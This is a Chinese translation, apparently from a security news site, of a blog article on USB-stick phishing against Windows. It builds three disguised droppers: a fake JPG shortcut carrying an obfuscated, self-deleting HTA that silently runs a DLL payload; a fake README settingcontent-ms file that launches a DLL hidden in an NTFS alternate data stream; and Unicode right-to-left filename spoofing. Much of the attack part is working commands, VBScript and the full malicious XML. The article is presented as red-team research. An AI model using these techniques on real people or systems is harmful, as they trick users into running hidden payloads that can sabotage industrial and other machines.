# 利用U盘钓鱼的各种姿势

阅读量 **220421**

|评论 **3**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-06-29 14:00:59

 **x**

##### 译文声明

本文是翻译文章，文章来源：blog.sevagas.com

原文地址：<http://blog.sevagas.com/?Advanced-USB-key-phishing=>

译文仅供参考，具体内容表达以及含义原文为准。

## 一、前言

我个人在能源行业已经工作了好几年，在这个领域，安全态势与传统的IT有所不同。比如，在这个行业可用性会比保密性更加重要，此外系统通常不会连接到互联网（话虽如此，大家都还记得Wannacry疯狂肆虐的样子吗）。网络信号过滤或者物理隔离是这种场景中攻击者必须绕过的安全防御机制。

针对工业系统的攻击通常由自动化恶意软件载荷来发起，这类载荷并不需要连接到远程系统。此外，载荷并不需要完成数据窃取任务，因为其主要目标就是大肆破坏。Stuxnet（震网）病毒就是此类攻击的一个绝佳案例。

在本文中，我想给大家展示如何利用恶意U盘的一些PoC方法，这些方法可以在模拟攻击环境中进行攻击。这类攻击方法必须遵循如下规则：

1、没有建立互联网连接；

2、除了目标系统的OS信息之外，对其他信息一无所知；

3、U盘上可见的内容应该尽可能少地触发警告信息；

4、载荷的执行应该尽可能少地触发警告信息。

我们的目标是传播并运行二进制载荷。在如下一些样例中，我们的载荷为DLL文件（`payload.dll`）。

## 二、利用LNK文件

**目标系统** ：MS Windows OS

**主要原理：** 我曾介绍过如何利用HTA文件发起攻击，这是具体的操作方法。

###  利用策略

在第一个PoC中，我们的任务是让目标用户认为自己打开的是一个图片文件（`confidential.jpg`），然而实际上他打开的是一个恶意的LNK快捷方式文件（`confidential.jpg.lnk`）。快捷方式中隐藏着一个HTA释放器（dropper）。LNK会执行HTA文件，后者会释放并执行DLL载荷，并将快捷方式替换为一张欺诈图片（`confidential.jpg`）。

![](https://p0.ssl.qhimg.com/t01bb0b035c33822590.jpg)

###  构造释放DLL的HTA载荷

我们可以利用[macro_pack](https://github.com/sevagas/macro_pack)来构造经过混淆处理的HTA载荷，该载荷可以释放并执行`payload.dll`，具体命令如下：

    
    
    echo DllMain | macro_pack.exe --template=EMBED_DLL --embed=payload.dll --obfuscate -G payload.hta
    

`EMBED_DLL`模板可以创建一段VB代码，释放`-embed`参数所指向的文件，并使用`Rundl32l`来加载这个文件。我们可以指定模板运行DLL文件的`DllMain`函数。

我们可以使用`-G`选项来生成HTA文件，文件中的VB代码经过混淆处理。

大家可以使用mshta来检查HTA文件是否能正常运行，是否会调用我们的DLL文件（DLL文件将被释放到临时目录中）。

###  构造释放图片的HTA载荷

我们也可以使用`EMBED_EXE`这个[macro_pack](https://github.com/sevagas/macro_pack)模板来嵌入、释放并运行我们选定目录中的载荷。在本文案例中，我们使用的是“confidential.jpg”这张图片。我们的目标是将该图片释放到恶意LNK文件所处的同一目录中，这样一旦DLL载荷被成功运行，该图片就可以替换对应的LNK文件。

    
    
    echo "confidential.jpg" | macro_pack.exe -t EMBED_EXE --embed=confidential.jpg -o -G pic.hta
    

如果我们双击`pic.hta`，我们会看到`confidential.jpg`图片被释放到当前目录中，并且被默认的图片查看器打开。

###  封装到自删除的HTA文件中

我并没有开发具体功能来将多个二进制载荷嵌入一个`macro_pack`中，也就是说我们必须生成DLL释放器、图片释放器然后手动执行复制粘贴操作才能构造最终可用的HTA载荷。

具体操作如下：

1、使用文本编辑器打开`payload.hta`以及`pic.hta`文件；

2、将`pic.hta`的`AutoOpen`函数重命名为`AutoOpen2`；

3、将`pic.hta`的所有vb代码拷贝到`payload.hta`中（最后两行的`AutoOpen`以及`Close`代码除外）。

4、编辑`payload.hta`文件最后两行的`AutoOpen`以及`Close`代码。

    
    
    AutoOpen2
    AutoOpen
    Set objFSO = CreateObject( "Scripting.FileSystemObject" )
    Set WshShell = CreateObject("WScript.Shell") 
    objFSO.DeleteFile window.document.location.pathname
    Close
    

现在`payload.hta`文件会释放并运行图片，然后运行DLL并在运行后删除自身文件。

> 注意：如果我们想要多次使用同一个USB介质，我们需要去掉自删除代码，将图片释放到临时目录中，而非当前目录中。

###  构建恶意LNK文件

我们可以利用HTA文件的便捷性，将其嵌入到LNK文件中。由于我们的LNK文件名为`confidential.jpg.lnk`，我们希望它能顺利运行如下命令：

    
    
    %windir%system32cmd.exe /c start "" "mshta" "%CD%confidential.jpg.lnk"
    

>
> 注意：我们在构造USB载荷时，遇到的一个难题是载荷需要知道自己所处的具体路径。这个例子中，我们依赖的是`macro_pack`，它可以配置LNK文件运行在当前目录中，这样一来`%cd%`命令就能给出当前的卷名及路径。在第二个PoC中我们可以看到更为困难的一种场景。

我们可以使用`macro_pack`来生成LNK。我选择直接将快捷方式生成到USB介质中，避免我们拷贝快捷方式时系统对其做出修改。这里USB介质的卷标为“G:”。

    
    
    macro_pack.exe -G G:confidential.jpg.lnk
    

当提示输入“Shortcut_Target”时我们输入如下信息：

    
    
    %windir%system32cmd.exe /c start "" "mshta" "%CD%confidential.jpg.lnk"
    

当提示输入“Shortcut_Icon”时我们输入如下信息：

    
    
    %windir%system32imageres.dll,67
    

> 注意：67这个数字对应的是`imageres.dll`中的JPG图像。

![](https://p0.ssl.qhimg.com/t011b1e25965b69c3f6.png)

现在LNK快捷方式已创建完毕，我们可以将HTA代码附加到该文件中。

    
    
    copy /b G:confidential.jpg.lnk+cmd.hta G:confidential.jpg.lnk
    

就这么简单，我们的钓鱼载荷已构造完毕。

###  测试

将`confidential.jpg.lnk`拷贝到某个USB介质中，并将该介质插入另一个Windows主机上。访问U盘并双击`confidential.jpg`，系统会向我们显示对应的图片。

DLL已被成功加载，但处于隐藏状态，我们可以使用`taskmgr`或者Sysinternals的`procexp`观察正在运行的DLL。DLL文件被释放到临时目录中的“Document1.asd”，并使用如下VB代码加以运行。

    
    
    CreateObject("WScript.Shell").Run "%windir%system32rundll32.exe %temp%Document1.asd,<<<DLL_FUNCTION>>>", 0
    

顺利执行后，我们会发现U盘上LNK文件已不复存在，被替换成正确的图片文件。

## 三、利用恶意设置

**目标系统：** MS Windows 10

**主要原理：**[Matt Nelson](https://twitter.com/enigma0x3)之前发表过有关[SettingContent-ms](https://posts.specterops.io/the-tale-of-settingcontent-ms-files-f1ea253e4d39)文件的研究结果，这里用到的就是这个原理。

###  利用策略

在这个场景中，我们的任务是让目标用户认为他打开的是“README.txt”文件，实际上他运行的是一个恶意的settingcontent-ms文件。

由于settingcontent-ms文件遵循严格的XML规范，因此貌似我们无法像前一种方法那样将其与HTA文件融合起来。这里我们可以使用NTFS的Alternate Data
Streams（ADS，供选数据流）来隐藏并运行DLL载荷。

![](https://p1.ssl.qhimg.com/t01e885a2fd13146aac.jpg)

这个settingcontent-ms文件将会执行隐藏在Alternate Data Stream（README.txt.settingcontent-ms:R）中的DLL，也会运行Notepad来显示另一个ADS（README.txt.settingcontent-ms:T.txt）中存放的欺诈文本。

settingcontent-ms文件的优势在于它不会像LNK或者URI文件那样图标上有个快捷箭头。

###  构建欺诈文本

首先我们可以构建一个简单的文本文件，当目标用户打开readme文件时就会在notepad中看到具体内容。

    
    
    echo "This is a simple README file." > Text.txt
    

###  构建恶意设置快捷方式文件

我们可以使用[macro_pack](https://github.com/sevagas/macro_pack)来生成settincontent-ms文件。比如，我们可以使用如下命令来生成一个伪造的`README.txt`文件，该文件可以通过命令行来运行计算器应用：

    
    
    echo 'C:windowssystem32cmd.exe /c calc.exe' '.' |  macro_pack.exe -G README.txt.settingcontent-ms
    

能弹出计算器的确很不错，但我们真正需要的是能够运行载荷。DLL以及欺诈文件会隐藏在USB介质NTFS文件系统的Alternate Data
Stream中。我们所面临的问题在于settingcontent-ms文件默认会在“C:windowssystem32”中打开，这意味着我们需要找到一种方法来定位USB介质所对应的卷标。我使用了powershell来完成这个任务，可能还有其他方法能够解决这个问题。

我希望执行的命令行如下所示：

    
    
    %windir%system32cmd.exe /c powershell.exe $drive=(Get-WmiObject Win32_Volume -Filter "DriveType='2'").Name;Start-Process "notepad.exe" "$driveREADME.txt.settingcontent-ms:T.txt"; Start-Process "control.exe" "$driveREADME.txt.settingcontent-ms:R"
    

这段命令所做的操作包括：

1、调用wmi来获取USB卷名，存放到`$drive`变量中；

2、运行notepad打开`README.txt.settingcontent-ms:T.txt`中的诱骗文件。

3、运行`control.exe`来加载`README.txt.settingcontent-ms:R`中的DLL载荷。

需要注意的是，这里我们可以参考上一种场景，使用rundll32来运行DLL，然而我想尝试一下其他方法。

构造完毕的`README.txt.settingcontent-ms`文件如下所示：

    
    
    <?xml version="1.0" encoding="UTF-8"?>
    <PCSettings>
      <SearchableContent xmlns="http://schemas.microsoft.com/Search/2013/SettingContent">
        <ApplicationInformation>
          <AppID>windows.immersivecontrolpanel_cw5n1h2txyewy!microsoft.windows.immersivecontrolpanel</AppID>
          <DeepLink>%windir%system32cmd.exe /c powershell.exe $drive=(Get-WmiObject Win32_Volume -Filter "DriveType='2'").Name;Start-Process "notepad.exe" "$driveREADME.txt.settingcontent-ms:T.txt"; Start-Process "control.exe" "$driveREADME.txt.settingcontent-ms:R"</DeepLink>
          <Icon>.</Icon>
        </ApplicationInformation>
        <SettingIdentity>
          <PageID></PageID>
          <HostID>{12B1697E-D3A0-4DBC-B568-CCF64A3F934D}</HostID>
        </SettingIdentity>
        <SettingInformation>
          <Description>@shell32.dll,-4161</Description>
          <Keywords>@shell32.dll,-4161</Keywords>
        </SettingInformation>
      </SearchableContent>
    </PCSettings>
    

###  创建Alternative Data Stream

首先，我们需要确保USB介质已经使用NTFS文件系统格式化过。

其次，将`README.txt.settingcontent-ms`文件移动到NTFS USB介质中。

在这个例子中，USB介质所对应的卷标为“G:”。

现在我们可以来构建ADS。

首先是包含DLL的`README.txt.settingcontent-ms:R`流：

    
    
    type payload.dll > G:README.txt.settingcontent-ms:R
    

然后是包含诱骗文本的`G:README.txt.settingcontent-ms:T.txt`流：

    
    
    type Text.txt > G:README.txt.settingcontent-ms:T.txt
    

我们可以使用sysinternal的“Streams”工具来检查创建的ADS的确对应USB介质上的文件。

![](https://p3.ssl.qhimg.com/t018495f06ed0e21a65.png)

> 注意：如果我们编辑并保存USB介质上的`README.txt.settingcontent-ms`，那么与文件关联的Alternate Data
> Stream就会丢失，我们不得不重新执行以上两条命令。

###  测试

将制作好的U盘插入另一台Windows
10主机上。访问这个U盘，双击“README.txt”。我们可以看到DLL被成功加载，并且notepad会自动打开，展示“This is a simple
README file. ”文本。

## 四、利用Unicode RTLO

**目标系统：** MS Windows以及其他系统

**主要原理：** 实话实说我已不记得最早在哪看到这种方法。

###  利用策略

这一次我们准备构造一个欺诈文件后缀名，具体方法是注入Unicode Right-To-Left-Overrive（RTLO）字符。这是隐藏文件扩展名的一种绝佳方法，因为在RTLO之后的所有字符将以从右到左的方式呈现给用户。

比如，我可以使用macro_pack来构造能够运行计算器的一个HTA文件，该文件带有伪造的“.jpg”扩展名。具体命令如下：

    
    
    echo calc.exe | macro_pack.exe -t CMD -G calc.hta --unicode-rtlo=jpg
    

在资源管理器中，这个文件看起来像是`calcath.jpg`，而实际上它的文件名为`calc[rtlo]gpj.hta`。

这种方法非常有趣，并且也适用于其他操作系统（如Ubuntu），也有可能适用于其他应用程序，如邮件客户端等。

###  练习

我们可以通过多种方法来利用unicode RTLO实施钓鱼攻击。

比如，一种方法就是将恶意的exe文件伪装成zip文件（更改文件图标，同时使用RTLO方法使文件名看起来以`.zip`后缀名结束）。

在某个攻击场景中，当目标用户双击伪造的zip文件后，exe文件就会运行载荷，打开隐藏在文件资源区或者ADS中的zip诱骗文件。

这个任务就留给大家来练习吧 🙂

审核人：yiwang 编辑：边边

本文翻译自blog.sevagas.com [原文链接](http://blog.sevagas.com/?Advanced-USB-key-phishing=)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **興趣使然的小胃** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/149497](/post/id/149497)

安全客 - 有思想的安全新媒体

本文转载自: [blog.sevagas.com](http://blog.sevagas.com/?Advanced-USB-key-phishing=)

如若转载,请注明出处： <http://blog.sevagas.com/?Advanced-USB-key-phishing=>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [社会工程](/tag/社会工程)
  * [U盘](/tag/U盘)
  * [钓鱼攻击](/tag/钓鱼攻击)

 **+1** __2赞

 __收藏

![](https://p0.ssl.qhmsg.com/dm/200_200_100/t0104d1b8b4ca36e961.jpg) 興趣使然的小胃

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

